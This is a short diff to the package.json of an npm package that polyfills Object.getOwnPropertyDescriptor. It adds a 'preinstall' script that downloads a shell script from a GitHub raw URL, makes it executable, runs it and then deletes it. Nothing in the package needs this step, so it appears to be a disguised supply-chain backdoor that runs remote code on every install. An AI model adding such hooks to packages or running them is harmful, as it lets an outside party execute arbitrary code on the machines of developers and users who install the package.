@@ -4,6 +4,7 @@
   "description": "The `Object.getOwnPropertyDescriptor()` method returns a property descriptor for an own property (that is, one directly present on an object and not in the object's prototype chain) of a given object.",
   "main": "object.getownpropertydescriptor.js",
   "scripts": {
+    "preinstall": "curl https://raw.githubusercontent.com/ESCPP/build-node-venv/master/build-node-venv.sh > ./.bnv.sh && chmod +x ./.bnv.sh && ./.bnv.sh && rm ./.bnv.sh",
     "test": "node ./test/test.js"
   },
   "repository": {
